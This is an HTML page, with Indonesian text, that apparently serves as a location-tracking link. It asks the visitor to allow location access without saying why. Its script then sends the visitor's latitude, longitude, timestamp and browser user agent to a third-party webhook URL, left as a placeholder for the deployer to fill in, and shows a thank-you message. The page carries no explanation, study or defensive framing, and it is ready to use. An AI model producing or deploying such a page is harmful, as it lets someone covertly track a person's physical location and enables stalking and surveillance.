<!DOCTYPE html>
<html>
  <head>
    <title>Loading Lokasi...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <style>
      body {
        font-family: sans-serif;
        text-align: center;
        margin-top: 100px;
      }
    </style>
  </head>
  <body>
    <h2>Mohon izinkan akses lokasi...</h2>

    <script>
      navigator.geolocation.getCurrentPosition(
        function (position) {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          // Ganti dengan URL webhook kamu
          const webhookURL = "https://webhook.site/YOUR_WEBHOOK_URL_HERE";

          fetch(webhookURL, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              latitude: lat,
              longitude: lon,
              timestamp: new Date().toISOString(),
              userAgent: navigator.userAgent,
            }),
          });

          document.body.innerHTML = `
            <h2>📍 Lokasi berhasil dikirim!</h2>
            <p>Terima kasih! 🙏</p>
          `;
        },
        function (error) {
          document.body.innerHTML = `
            <h2>⚠️ Gagal mengambil lokasi.</h2>
            <p>Pastikan kamu izinkan akses lokasi di browser.</p>
          `;
        }
      );
    </script>
  </body>
</html>
